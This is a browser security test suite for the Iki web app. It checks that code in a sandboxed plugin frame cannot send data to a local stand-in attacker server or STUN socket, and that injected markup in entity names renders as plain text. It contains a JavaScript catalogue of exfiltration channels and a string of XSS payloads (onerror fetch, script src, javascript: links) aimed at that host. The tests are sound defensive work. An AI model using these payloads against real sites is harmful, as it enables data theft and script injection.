# ruff: noqa: F811 - test_browser's fixtures, imported by name, are parameters here.
"""Exfiltration, on Chromium, Firefox and WebKit: nothing gets data out of Iki's pages.

An attacker's server, on another origin, records every request it gets, and a UDP
socket every datagram (WebRTC's STUN). Then, in each browser:

- code in a plugin component's sandboxed frame (where a plugin's own code runs) tries
  every way out a page has: fetch, beacons, sockets, event streams, images, styles,
  fonts, preloads, scripts, modules, workers, forms, pop-ups, frames, a frame of its
  own, navigating itself or the page, and WebRTC;
- Iki's own pages show values written to attack them: markup and script in every text
  a person can set, rendered in the grid, an entity's page, its history and a search.

The attacker must hear nothing. ADR 0102 says what each refusal rests on.
"""

import http.server
import socket
import threading
import time
from collections.abc import Iterator
from dataclasses import dataclass, field
from typing import Any

import pytest
from org_world import World
from playwright.sync_api import Page
from test_browser import (  # noqa: F401 - fixtures
    _flush_past_late_requests,
    _orm_beside_playwright,
    assert_clean,
    browser,
    browser_name,
    open_as,
    playwright,
    server,
    world,
)

pytestmark = [pytest.mark.django_db(transaction=True), pytest.mark.built_web_app]


@dataclass
class Attacker:
    """Another origin's server, and a UDP port: what reaches either is exfiltrated."""

    url: str
    udp_port: int
    heard: list[str] = field(default_factory=list)

    def quiet_for(self, seconds: float = 2.0) -> list[str]:
        """What it heard, after giving late requests time to arrive."""
        time.sleep(seconds)
        return list(self.heard)


@pytest.fixture(scope="module")
def attacker() -> Iterator[Attacker]:
    heard: list[str] = []

    class Record(http.server.BaseHTTPRequestHandler):
        def _any(self) -> None:
            heard.append(f"{self.command} {self.path}")
            self.send_response(204)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

        do_GET = do_POST = do_PUT = do_OPTIONS = do_HEAD = _any  # noqa: N815

        def log_message(self, *_: Any) -> None:
            return

    httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Record)
    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp.bind(("127.0.0.1", 0))
    udp.settimeout(0.2)
    stop = threading.Event()

    def listen() -> None:
        while not stop.is_set():
            try:
                data, _ = udp.recvfrom(2048)
            except TimeoutError:
                continue
            heard.append(f"UDP {len(data)} bytes")

    threads = [
        threading.Thread(target=httpd.serve_forever, daemon=True),
        threading.Thread(target=listen, daemon=True),
    ]
    for thread in threads:
        thread.start()
    found = Attacker(f"http://127.0.0.1:{httpd.server_address[1]}", udp.getsockname()[1], heard)
    yield found
    stop.set()
    httpd.shutdown()
    httpd.server_close()
    udp.close()


@pytest.fixture(autouse=True)
def _forget(attacker: Attacker) -> None:
    attacker.heard.clear()


#: Every way out a frame's code has, each naming itself in the address it tries.
WAYS_OUT = """
async ([out, udp]) => {
  const tried = {};
  const attempt = async (name, what) => {
    try {
      await what(`${out}/${name}`);
      tried[name] = "ran";
    } catch (error) {
      tried[name] = "refused";
    }
  };
  const settle = (ms) => new Promise((done) => setTimeout(done, ms));
  const element = (tag, attributes) => {
    const made = document.createElement(tag);
    Object.assign(made, attributes);
    document.body.append(made);
    return made;
  };
  await attempt("fetch", (to) => fetch(to, { mode: "no-cors" }));
  await attempt("xhr", (to) => { const x = new XMLHttpRequest(); x.open("GET", to); x.send(); });
  await attempt("beacon", (to) => { if (!navigator.sendBeacon(to, "data")) throw new Error(); });
  await attempt("websocket", (to) => { new WebSocket(to.replace("http", "ws")); });
  await attempt("eventsource", (to) => { new EventSource(to); });
  await attempt("image", (to) => { new Image().src = to; });
  await attempt("style", (to) => { document.body.style.backgroundImage = `url(${to})`; });
  await attempt("stylesheet", (to) => { element("link", { rel: "stylesheet", href: to }); });
  await attempt("font", (to) => new FontFace("x", `url(${to})`).load());
  await attempt("prefetch", (to) => { element("link", { rel: "prefetch", href: to }); });
  await attempt("preload", (to) => { element("link", { rel: "preload", as: "image", href: to }); });
  await attempt("script", (to) => { element("script", { src: to }); });
  await attempt("module", (to) => import(to));
  await attempt("worker", (to) => { new Worker(to); });
  await attempt("audio", (to) => { element("audio", { src: to, autoplay: true }); });
  await attempt("frame", (to) => { element("iframe", { src: to }); });
  await attempt("object", (to) => { element("object", { data: to }); });
  await attempt("form", (to) => {
    const form = element("form", { action: to, method: "post" });
    form.submit();
  });
  await attempt("popup", (to) => { if (!window.open(to)) throw new Error(); });
  await attempt("page", (to) => { window.top.location.href = to; });
  // A frame of its own, about:blank, shares this one's origin and policy: its fetch
  // is this one's.
  await attempt("own-frame", (to) => {
    const own = element("iframe", {});
    return own.contentWindow.fetch(to, { mode: "no-cors" });
  });
  // WebRTC to the attacker's STUN server: no CSP directive governs it.
  await attempt("webrtc", async () => {
    const peer = new RTCPeerConnection({ iceServers: [{ urls: `stun:127.0.0.1:${udp}` }] });
    peer.createDataChannel("out");
    await peer.setLocalDescription(await peer.createOffer());
    await settle(1500);
    peer.close();
  });
  // And from a frame of its own, whose globals are fresh.
  await attempt("webrtc-own-frame", async () => {
    const own = document.createElement("iframe");
    document.body.append(own);
    const Peer = own.contentWindow.RTCPeerConnection;
    const peer = new Peer({ iceServers: [{ urls: `stun:127.0.0.1:${udp}` }] });
    peer.createDataChannel("out");
    await peer.setLocalDescription(await peer.createOffer());
    await settle(1500);
    peer.close();
  });
  // Frames of its own, whose code would run with fresh globals: removed before they load.
  const lasts = async (frame) => {
    await settle(300);
    if (!frame.isConnected) throw new Error("removed");
  };
  await attempt("srcdoc-frame", () => lasts(element("iframe", { srcdoc: "<p>x</p>" })));
  await attempt("shadow-frame", () => {
    const root = element("div", {}).attachShadow({ mode: "closed" });
    const inner = document.createElement("iframe");
    inner.srcdoc = "<p>x</p>";
    root.append(inner);
    return lasts(inner);
  });
  await attempt("declarative-shadow", () => {
    element("div", {}).setHTMLUnsafe(
      '<template shadowrootmode="closed"><iframe srcdoc="x"></iframe></template>',
    );
  });
  await settle(500);
  tried.frames = window.length;
  return tried;
}
"""


def _component_frame(open_as: Any, world: World) -> tuple[Page, Any]:
    """An entity's page, with a plugin's component open in its frame."""
    from iki_server.entities import services as entities
    from iki_server.entities.models import Entity

    made = entities.create(
        world.users["admin"],
        "protein.Protein",
        world.project,
        {"sequence": "MLEICLKLVG", "name": "ABL1"},
    )
    hrid = Entity.objects.get(pk=made.entity.pk).hrid
    page = open_as("admin", f"/entities/{hrid}/")
    page.get_by_role("link", name="Residues").click()
    page.frame_locator('iframe[title="Residues"]').get_by_text(f"{hrid}: 10 residues").wait_for()
    (frame,) = [f for f in page.frames if "/plugin-components/protein.residues/" in f.url]
    return page, frame


def test_a_components_code_gets_nothing_out(
    open_as: Any, world: World, attacker: Attacker, browser_name: str
) -> None:
    page, frame = _component_frame(open_as, world)
    tried = frame.evaluate(WAYS_OUT, [attacker.url, attacker.udp_port])
    assert attacker.quiet_for() == [], (browser_name, tried)
    # What no policy covers, the frame's first script takes away (ADR 0102).
    closed = ("webrtc", "webrtc-own-frame", "srcdoc-frame", "shadow-frame", "declarative-shadow")
    assert {k: tried[k] for k in closed} == dict.fromkeys(closed, "refused"), browser_name
    assert tried["frames"] == 0
    assert not [f for f in page.frames if f.url.startswith("about:")], browser_name
    # The frame is still the component's: none of that took it, or the page, elsewhere.
    assert "/plugin-components/protein.residues/" in frame.url
    assert page.url.endswith("/") and "/entities/" in page.url


def test_a_component_that_takes_its_frame_elsewhere_reaches_nothing(
    open_as: Any, world: World, attacker: Attacker
) -> None:
    """Navigating isn't a request CSP's fetch directives govern: the page's frame-src,
    which every navigation of its frames answers to, refuses it before it leaves."""
    page, frame = _component_frame(open_as, world)
    frame.evaluate("(to) => { location.href = to; }", f"{attacker.url}/navigate?data=secret")
    assert attacker.quiet_for() == []
    # Chromium and WebKit show the refusal as an error page, which the page closes;
    # Firefox leaves the frame where it was.
    closed = page.get_by_role("alert").get_by_text(
        "Residues tried to open another page, so Iki closed it."
    )
    assert closed.count() == 1 or "/plugin-components/protein.residues/" in frame.url


#: Written into every text a person sets, to break out of wherever it's shown.
def _hostile(attacker: Attacker) -> str:
    # A name holds 255 characters: each attack, short.
    at = attacker.url
    return (
        f'"><img src={at}/i onerror=fetch(src+1)><script src={at}/s></script>'
        f"<svg onload=fetch('{at}/v')><a href=javascript:fetch('{at}/j')>x</a>"
        f"<style>@import'{at}/c'</style>"
    )


def test_values_written_to_attack_a_page_are_only_ever_text(
    open_as: Any, world: World, attacker: Attacker
) -> None:
    from iki_server.entities import services as entities
    from iki_server.entities.models import Entity

    hostile = _hostile(attacker)
    made = entities.create(
        world.users["admin"],
        "protein.Protein",
        world.project,
        {"sequence": "MLEICLKLVG", "name": hostile},
    )
    entity = Entity.objects.get(pk=made.entity.pk)
    entities.update(
        world.users["admin"], entity, {"name": hostile.replace(">x<", ">y<")}, expected_revision=1
    )
    # Each page, and whether it shows the name: the project's overview shows counts.
    for path, shown in (
        (f"/projects/{world.project.slug}/", False),
        (f"/projects/{world.project.slug}/entities/?type=protein.Protein", True),
        (f"/entities/{entity.hrid}/", True),
        (f"/entities/{entity.hrid}/history/", True),
        (f"/projects/{world.project.slug}/entities/?type=protein.Protein&q=img", True),
    ):
        page = open_as("admin", path)
        if shown:
            # Shown as what it is: text.
            page.get_by_text('"><img src=', exact=False).first.wait_for()
        assert (
            page.locator(f'img[src^="{attacker.url}"], script[src^="{attacker.url}"]').count() == 0
        )
        assert_clean(page)
        page.context.close()
    assert attacker.quiet_for() == []
